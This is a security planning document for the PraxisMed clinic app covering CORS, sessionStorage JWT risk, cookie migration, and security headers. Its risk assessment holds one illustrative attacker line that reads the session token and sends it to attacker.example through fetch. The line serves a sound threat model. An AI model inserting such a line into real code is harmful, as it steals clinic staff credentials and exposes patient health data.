# Production CORS / Auth / Domain Plan — PraxisMed

**Date:** 2026-07-03
**Sprint:** Sprint 12 / Module 93
**Status:** Planning only — no implementation in this module; no runtime behavior changed

---

## 1. Purpose

This document defines the production domain topology, CORS policy, session/auth risk
assessment, and recommended migration path for PraxisMed before any production
deployment or auth refactor begins.

**What this document is:**
- A concrete production domain topology with URL placeholders
- A CORS policy definition for local, staging, and production tiers
- A risk assessment of the current `sessionStorage` JWT mechanism
- A recommended httpOnly Secure SameSite cookie migration path
- A Vapi/n8n server-to-server domain plan
- A security headers plan

**What this document is not:**
- An implementation guide for the httpOnly cookie migration (deferred to Module 95+)
- A deployment guide (that is Module 94)
- A production domain registration or DNS configuration
- A CI/CD pipeline definition
- A Fabel 5 / frontend UX sprint plan

No runtime code was changed in this module.

---

## 2. Current Local State

As verified by code inspection at Module 93:

| Component | Local State |
|---|---|
| Backend URL | `http://127.0.0.1:8000` (uvicorn, port 8000) |
| Frontend URL | `http://localhost:3000` (Next.js dev server) |
| Auth flow | `POST /auth/login` returns `{ access_token, token_type: "bearer", expires_in_seconds: 3600 }` |
| Token storage | `sessionStorage.setItem("praximed_access_token", token)` — `frontend/lib/auth.ts` line 45 |
| Token use | `Authorization: Bearer <token>` injected in every API call via `frontend/lib/api.ts` |
| Token expiry | 60 minutes (`DEFAULT_ACCESS_TOKEN_EXPIRE_MINUTES = 60` in `jwt_tokens.py`) |
| Token refresh | None — no `/auth/refresh` endpoint exists |
| Auth guard | Client-side only — `isAuthenticated()` checks `sessionStorage.getItem(TOKEN_KEY) !== null`; no Next.js middleware |
| Login redirect | `router.push('/dashboard')` on successful login; dashboard redirects to `/login` if `!isAuthenticated()` |
| Logout | `clearToken()` calls `sessionStorage.removeItem(TOKEN_KEY)` |
| CORS | `CORSMiddleware` with explicit origins; defaults to `http://localhost:3000,http://127.0.0.1:3000` |
| Vapi URL | ngrok tunnel — ephemeral; local test only |
| n8n URL | ngrok or not configured — local test only |

**Important note from `frontend/lib/auth.ts` comment (line 3–5):**
> "Token storage uses sessionStorage (local development only). For production: replace
> with httpOnly cookies set by the backend /auth/session endpoint — do not store JWTs
> in localStorage or sessionStorage in a production deployment."

This comment is authoritative. The `sessionStorage` path is intentionally labeled
local-dev only in the code.

---

## 3. Proposed Production Domain Topology

No production domain has been registered yet. The values below are placeholders.
Replace `praximed.example.com` with the actual registered domain before deployment.

### 3.1 URL Table

| Tier | Frontend URL | Backend URL | Notes |
|---|---|---|---|
| **Local** | `http://localhost:3000` | `http://127.0.0.1:8000` | Dev server; plain HTTP |
| **Staging** | `https://app-staging.praximed.example.com` | `https://api-staging.praximed.example.com` | HTTPS required; synthetic data only |
| **Production** | `https://app.praximed.example.com` | `https://api.praximed.example.com` | HTTPS required; real PHI |

### 3.2 Vapi Tool Endpoint

| Tier | Vapi Tool URL |
|---|---|
| **Local / test** | `https://<ngrok-id>.ngrok-free.app/vapi/tools/capture-appointment-request` (ephemeral; test only) |
| **Staging** | `https://api-staging.praximed.example.com/vapi/tools/capture-appointment-request` |
| **Production** | `https://api.praximed.example.com/vapi/tools/capture-appointment-request` |

### 3.3 n8n Webhook Endpoint

| Tier | n8n Webhook URL |
|---|---|
| **Local / test** | `https://<ngrok-id>.ngrok-free.app/webhooks/n8n/calendar-sync` (ephemeral; test only) |
| **Staging** | `https://api-staging.praximed.example.com/webhooks/n8n/calendar-sync` |
| **Production** | `https://api.praximed.example.com/webhooks/n8n/calendar-sync` |

### 3.4 Env Var Mapping per Tier

| Variable | Local | Staging | Production |
|---|---|---|---|
| `NEXT_PUBLIC_API_BASE_URL` | _(unset; fallback `http://127.0.0.1:8000`)_ | `https://api-staging.praximed.example.com` | `https://api.praximed.example.com` |
| `FRONTEND_CORS_ORIGINS` | _(unset; defaults apply)_ | `https://app-staging.praximed.example.com` | `https://app.praximed.example.com` |

---

## 4. CORS Policy

### 4.1 Allowed Origins (per tier)

| Tier | `FRONTEND_CORS_ORIGINS` Value |
|---|---|
| **Local** | Not set — defaults to `http://localhost:3000,http://127.0.0.1:3000` |
| **Staging** | `https://app-staging.praximed.example.com` |
| **Production** | `https://app.praximed.example.com` |

**Hard rules:**
- Wildcard `*` is never used. The `_cors_origins()` function in `main.py` never
  returns a wildcard regardless of the env var value.
- ngrok URLs must never appear as a `FRONTEND_CORS_ORIGINS` value in any tier above
  local testing.
- Every origin must include the exact scheme (`https://`), domain, and port (if
  non-standard). A mismatch of any part causes CORS rejection.

### 4.2 Allowed Methods

Currently configured in `main.py`:

```python
allow_methods=["GET", "POST", "PATCH", "DELETE", "OPTIONS", "PUT"]
```

Methods actually used by the frontend today:
- `GET` — all data fetch endpoints
- `POST` — `/auth/login`, `/calendar/availability/*`, `/vapi/tools/*`
- `PATCH` — `/appointment-requests/{id}/status`
- `OPTIONS` — browser preflight (handled by CORSMiddleware automatically)

`DELETE` and `PUT` are configured but not currently used by the frontend. They may be
retained for future endpoints.

### 4.3 Allowed Headers

Currently configured in `main.py`:

```python
allow_headers=["Content-Type", "Authorization"]
```

These two headers cover all current browser-to-backend requests:
- `Content-Type: application/json` — all POST/PATCH bodies
- `Authorization: Bearer <token>` — all authenticated requests

**Machine auth headers** (`X-Vapi-Service-Name`, `X-Vapi-Clinic-Id`, `X-Vapi-Scopes`,
`X-Vapi-Signature`, `X-N8N-Signature`, `X-Internal-Signature`) are sent by Vapi and n8n
servers directly to the backend. They are **server-to-server** requests — not browser
requests. They do not go through browser CORS and do not need to appear in
`allow_headers`. See Section 8.

### 4.4 Credentials Policy

`allow_credentials=True` is currently set in `CORSMiddleware`. This is required if the
browser ever sends cookies (e.g., after the httpOnly cookie migration). It is harmless
under the current Bearer token approach.

**Implication for cookie migration:** When httpOnly cookies are introduced, `allow_credentials=True`
is already set. The browser `fetch` call must include `credentials: "include"` to send
cookies. This requires the `Origin` to exactly match one of the allowed origins — a
wildcard origin cannot be used with credentials.

### 4.5 Preflight Behavior

The browser sends a preflight `OPTIONS` request when:
- The request uses a non-simple method (PATCH, DELETE, PUT)
- The request uses `Authorization` or `Content-Type: application/json` headers

FastAPI's `CORSMiddleware` handles preflight automatically. No route-level changes are
needed. The current configuration is correct.

---

## 5. Auth / Session Current Risk Assessment

### 5.1 Current Mechanism

```
POST /auth/login
  → backend verifies credentials → returns { access_token: "<JWT>", ... }
  → frontend: sessionStorage.setItem("praximed_access_token", token)
  → all subsequent API requests: Authorization: Bearer <token>
  → token expires after 60 minutes
  → on expiry: API returns 401; frontend shows no auto-redirect
```

### 5.2 Risk: sessionStorage Is XSS-Accessible

`sessionStorage` is readable by any JavaScript running on the same origin. If an
attacker can inject and execute arbitrary JavaScript (XSS), they can steal the JWT:

```javascript
// Attacker-controlled script could do:
fetch("https://attacker.example/steal?token=" + sessionStorage.getItem("praximed_access_token"))
```

The stolen token can be used to impersonate the authenticated clinic staff member for up
to 60 minutes (the current token lifetime).

**Severity:** High — this is the reason `auth.ts` explicitly flags `sessionStorage` as
local-dev only.

**Current mitigations (insufficient for production PHI):**
- 60-minute token expiry limits the attack window
- No `localStorage` — `sessionStorage` is cleared on tab/browser close
- No third-party scripts currently in the frontend

**Missing mitigations for production:**
- No Content Security Policy (CSP) header — inline scripts not blocked
- No httpOnly cookie — token is accessible to JavaScript
- No XSS sanitization audit
- No subresource integrity on external scripts (none currently used)

### 5.3 Risk: No Token Refresh

When the 60-minute token expires:
- The next API call returns HTTP 401
- The frontend does not auto-redirect to `/login`
- The staff member sees a generic API error
- Recovery: manual navigation to `/login` and re-authentication

**Severity:** Medium UX risk; not a security blocker, but disruptive in production.

### 5.4 Acceptable for Local / Internal Demo Only

The `sessionStorage` token approach is acceptable for:
- Local developer testing
- Internal demos where the frontend is not exposed to untrusted networks
- Stakeholder proof-of-concept on controlled hardware

It is **not acceptable** for a production deployment serving real PHI (patient names,
phone numbers, health data) to real clinic staff.

---

## 6. Recommended Cookie / Session Migration Path

This is a planning section. No implementation in Module 93.

### 6.1 Three Options

**Option A — Keep Bearer Token with Strong CSP and Short Expiry (Accepted Risk)**

- Retain `sessionStorage` storage
- Add a strict Content-Security-Policy header blocking inline scripts and restricting
  script sources to trusted CDNs and self
- Reduce token expiry to 15–30 minutes
- Explicitly document this as an accepted risk in a security decision record
- Not recommended for a PHI-handling app without additional XSS controls

**Option B — Migrate to httpOnly Secure SameSite Cookie (Recommended)**

- Backend change: `POST /auth/login` sets a cookie (`Set-Cookie: praximed_session=<JWT>; HttpOnly; Secure; SameSite=Lax; Path=/; Max-Age=3600`)
- Frontend change: remove `storeToken`, `getToken`, `clearToken`, `isAuthenticated` functions (or replace with presence check via a `/auth/me` call)
- Frontend change: replace manual `Authorization: Bearer` injection with `credentials: "include"` on all fetch calls
- Backend change: `get_current_user` dependency reads from cookie instead of (or in addition to) `Authorization` header
- Logout: `POST /auth/logout` response sets `Set-Cookie` with `Max-Age=0` to clear the cookie
- Token refresh: `/auth/refresh` issues a new cookie from a rotation check

**Option C — Hybrid Transition**

- Backend accepts both `Authorization: Bearer` header and cookie during a migration window
- Frontend migrates to cookie; old clients continue to work
- Useful when multiple frontend versions may coexist during a staged rollout

**Recommendation:** Option B before any real clinic PHI is processed. Option C if a
staged migration is needed during a live rollout.

### 6.2 Backend Changes Required for Option B

| Change | File | Detail |
|---|---|---|
| Set cookie on login | `backend/app/api/routes/auth.py` | `Response.set_cookie()` with httpOnly, Secure, SameSite=Lax |
| Read cookie in auth dependency | `backend/app/core/auth_context.py` or the current JWT dependency | Try `Authorization` header first; fall back to cookie |
| Clear cookie on logout | New `POST /auth/logout` route | `response.delete_cookie("praximed_session")` |
| Optional refresh endpoint | New `POST /auth/refresh` route | Issue new cookie; check expiry of existing cookie |

### 6.3 Frontend Changes Required for Option B

| Change | File | Detail |
|---|---|---|
| Remove token storage | `frontend/lib/auth.ts` | Remove `storeToken`, `getToken`, `clearToken`; replace `isAuthenticated` with `/auth/me` call or cookie existence check |
| Remove Bearer header injection | `frontend/lib/api.ts` | Remove `Authorization` header injection; add `credentials: "include"` to all fetch calls |
| Logout route | `frontend/app/dashboard/page.tsx` | Call `POST /auth/logout` before clearing local state |

### 6.4 CSRF Strategy

With SameSite=Lax cookies:
- `GET` requests from other origins do not send the cookie (safe)
- Cross-site `POST`/`PATCH`/`DELETE` requests do not send the cookie (safe for strict cross-site scenarios)
- SameSite=Lax protects against the most common CSRF attacks without requiring a CSRF token for same-site requests

If the frontend and backend are on different subdomains of the same registered domain
(e.g., `app.praximed.example.com` → `api.praximed.example.com`), setting `Domain=praximed.example.com`
on the cookie allows the browser to send it cross-subdomain. In this case, `SameSite=Lax`
still provides cross-site CSRF protection. A CSRF double-submit token should be added
for defense-in-depth.

If frontend and backend are on entirely different domains, cookies cannot be shared
without `SameSite=None; Secure`, which requires careful CSRF token handling.

**Recommendation:** Use same registered domain with subdomain split (`app.*` + `api.*`).
Set cookie `Domain=praximed.example.com`. `SameSite=Lax`. No CSRF token required for
MVP; add double-submit for production hardening.

---

## 7. Domain / Auth Interaction

| Scenario | Implication |
|---|---|
| Frontend (`app.praximed.example.com`) and backend (`api.praximed.example.com`) on same registered domain | Cookie with `Domain=praximed.example.com` is shared across subdomains; `credentials: "include"` sends it; `SameSite=Lax` protects against cross-site attacks |
| Frontend and backend on different registered domains | Cookies cannot be shared; must use `SameSite=None; Secure` with CSRF token; more complex |
| HTTPS required | `Secure` flag on cookie means the cookie is only sent over HTTPS; plain HTTP connections cannot receive or send the cookie |
| `Secure` cookie in local dev | Local dev (`http://localhost`) is excluded from the `Secure` requirement by browsers; the cookie is still sent locally without HTTPS |
| Staging isolation | Staging cookies must have a different `Domain` or path than production to prevent staging credentials from being sent to production endpoints |

**Recommended domain structure:** Subdomain split on a single registered domain.
This is the simplest path for cookie-based auth and avoids cross-domain CORS complexity.

---

## 8. Vapi / n8n Domain Plan

### 8.1 Machine-to-Machine — Not Browser CORS

Vapi and n8n call the backend directly as HTTP clients. These requests:
- Do not originate from a browser
- Do not trigger browser CORS preflight
- Do not require `Content-Type` or `Authorization` in `allow_headers` (those are for the frontend)
- Are authenticated via machine auth headers (`X-Vapi-Service-Name`, `X-Vapi-Clinic-Id`, `X-Vapi-Scopes`) and HMAC webhook signatures

The machine auth headers and webhook signature headers (`X-Vapi-Signature`, `X-N8N-Signature`) do **not** need to be added to `FRONTEND_CORS_ORIGINS` or `allow_headers` in `CORSMiddleware`. They are never sent by the browser.

### 8.2 Production Vapi Requirements

| Requirement | Detail |
|---|---|
| Server URL | Stable HTTPS — `https://api.praximed.example.com/vapi/tools/capture-appointment-request` |
| `X-Vapi-Service-Name` | `vapi` |
| `X-Vapi-Clinic-Id` | Production clinic UUID (not `11111111-...`) |
| `X-Vapi-Scopes` | `vapi:tool` (singular — `vapi:tools` plural is rejected with HTTP 403) |
| Clinic ID source | Always from machine auth header `X-Vapi-Clinic-Id`; patient-supplied `clinic_ref` in tool call arguments is silently ignored |
| Webhook secret | `VAPI_WEBHOOK_SECRET` must match the signing secret in the Vapi production assistant |
| ngrok | Allowed for local smoke testing only; never in production |

### 8.3 Production n8n Requirements

| Requirement | Detail |
|---|---|
| Webhook URL | Stable HTTPS — `https://api.praximed.example.com/webhooks/n8n/calendar-sync` |
| `X-Service-Name` | `n8n` |
| `X-Service-Clinic-Id` | Production clinic UUID |
| `X-Service-Scopes` | `calendar:sync` |
| Webhook secret | `N8N_WEBHOOK_SECRET` must match the n8n workflow signing secret |
| ngrok | Allowed for local smoke testing only; never in production |

### 8.4 Machine Endpoints Must Not Depend on Browser Session

The machine auth endpoints (`/vapi/tools/*`, `/webhooks/*`, `/calendar/*`) are protected
by `get_machine_auth_context` — not by `get_current_user`. They do not use the JWT
Bearer token or any cookie. No browser session state is involved. These endpoints are
independent of the auth migration in Section 6.

---

## 9. Security Headers / Browser Hardening Plan

Planning only. No implementation in Module 93.

These headers should be added to the backend response (via a FastAPI middleware) or the
reverse proxy (Nginx/Caddy) before production launch:

| Header | Purpose | Recommended Value |
|---|---|---|
| `Content-Security-Policy` | Restrict script sources; block inline scripts to reduce XSS surface | `default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'; img-src 'self' data:; connect-src 'self' https://api.praximed.example.com` (adjust per actual assets) |
| `X-Frame-Options` or `frame-ancestors` | Block clickjacking — prevent dashboard from being iframed | `DENY` or `frame-ancestors 'none'` |
| `Referrer-Policy` | Control what referrer is sent to external resources | `strict-origin-when-cross-origin` |
| `Strict-Transport-Security` | Force HTTPS after first visit | `max-age=31536000; includeSubDomains` (after HTTPS is confirmed working) |
| `Permissions-Policy` | Disable unused browser APIs | `camera=(), microphone=(), geolocation=()` |
| `X-Content-Type-Options` | Prevent MIME sniffing | `nosniff` |

**Note on CSP and sessionStorage JWT:** A strict CSP significantly reduces XSS risk but
does not eliminate it entirely. Even with CSP, the strongly recommended path remains
httpOnly cookie migration before serving real PHI.

**Secrets in frontend public env:** `NEXT_PUBLIC_*` variables are embedded in the
browser bundle and visible to anyone who inspects the page source. They must never
contain secrets. The only current `NEXT_PUBLIC_*` variable (`NEXT_PUBLIC_API_BASE_URL`)
is a URL, not a secret — this is correct.

---

## 10. Production URL / Env Mapping

| Variable | Local | Staging | Production |
|---|---|---|---|
| `NEXT_PUBLIC_API_BASE_URL` | `http://127.0.0.1:8000` (fallback) | `https://api-staging.praximed.example.com` | `https://api.praximed.example.com` |
| `FRONTEND_CORS_ORIGINS` | _(unset; `http://localhost:3000` default)_ | `https://app-staging.praximed.example.com` | `https://app.praximed.example.com` |
| Frontend URL | `http://localhost:3000` | `https://app-staging.praximed.example.com` | `https://app.praximed.example.com` |
| Backend URL | `http://127.0.0.1:8000` | `https://api-staging.praximed.example.com` | `https://api.praximed.example.com` |
| Vapi tool URL | `https://<ngrok>.ngrok-free.app/vapi/tools/...` | `https://api-staging.praximed.example.com/vapi/tools/...` | `https://api.praximed.example.com/vapi/tools/...` |
| n8n webhook URL | `https://<ngrok>.ngrok-free.app/webhooks/n8n/...` | `https://api-staging.praximed.example.com/webhooks/n8n/...` | `https://api.praximed.example.com/webhooks/n8n/...` |

---

## 11. Implementation Sequence Recommendation

| Module | Action | Type |
|---|---|---|
| 93 (this) | CORS/auth/domain plan | Docs only |
| 94 | Deployment smoke runbook | Docs only |
| Checkpoint 12 | Production readiness go/no-go | Review |
| 95+ | Auth hardening: httpOnly Secure SameSite cookie migration | Implementation |
| 95+ or later | Security headers middleware | Implementation |
| 95+ or later | Token refresh endpoint | Implementation |
| Later | Production CORS config deployment | Infrastructure |
| Later | Fabel 5 / premium frontend UX sprint | UX |
| Later | Appointment workflow expansion (Reject, Assign, Archive) | Feature |

---

## 12. Risks and Decisions Table

| Risk | Severity | Status |
|---|---|---|
| `sessionStorage` JWT — XSS-accessible token | **High — blocker for real PHI production** | Not resolved; httpOnly cookie migration required before production PHI |
| Wildcard CORS `*` in production | **Blocker** | Not present; `_cors_origins()` never returns wildcard — CORRECT |
| No HTTPS / TLS termination | **Blocker** | Not configured; reverse proxy required before production |
| ngrok in production | **Blocker** | Not present in production; local test only — CORRECT |
| No stable production domain | **High** | Domain not registered yet; placeholder used in this plan |
| Missing cookie/CSRF plan | **High** | Planned in this doc (Section 6); not yet implemented |
| No token refresh | **Medium** | 60-minute expiry causes silent failures; UX issue in production |
| Vapi URL misconfiguration (ngrok or wrong URL) | **High** | Must be updated before staging/production Vapi use |
| Vapi production assistant using local UUID | **Blocker** | `11111111-...` UUID must not appear in production Vapi assistant config |
| `NEXT_PUBLIC_API_BASE_URL` not set for production | **High** | Frontend falls back to `http://127.0.0.1:8000`; all API calls fail |
| `FRONTEND_CORS_ORIGINS` not set for production | **High** | Browser CORS blocks all API calls from production frontend |
| Secrets in frontend public env | **Blocker** | Not present currently; no secrets in `NEXT_PUBLIC_*` — CORRECT |
| No auth guard middleware (client-side only) | **Medium** | Dashboard redirect is JavaScript-only; server renders the page before redirect |
| No audit log PHI policy review | **Medium** | `raw_payload` column stores PHI; access control not yet defined for production |

---

## 13. Go / No-Go Assessment

### Not ready for production launch.

**Blockers remaining before first production deployment:**
1. `sessionStorage` JWT — must migrate to httpOnly cookie before serving real PHI
2. No stable HTTPS domain — must register and configure TLS
3. No production PostgreSQL — local Docker only
4. No stable Vapi production URL — ngrok is ephemeral
5. `FRONTEND_CORS_ORIGINS` and `NEXT_PUBLIC_API_BASE_URL` not configured
6. Frontend built with `npm run dev` — must use `npm run build` + `next start`

### Ready to proceed to deployment smoke runbook planning.

The codebase is architecturally sound for production. All blockers are configuration
and infrastructure items, not fundamental design flaws. The recommended next steps:

- **Sprint 12 / Module 94** — Deployment Smoke Runbook (docs)
- **Architecture Checkpoint 12** — Production readiness go/no-go decision
- **Module 95+** — Auth hardening implementation (httpOnly cookie migration)
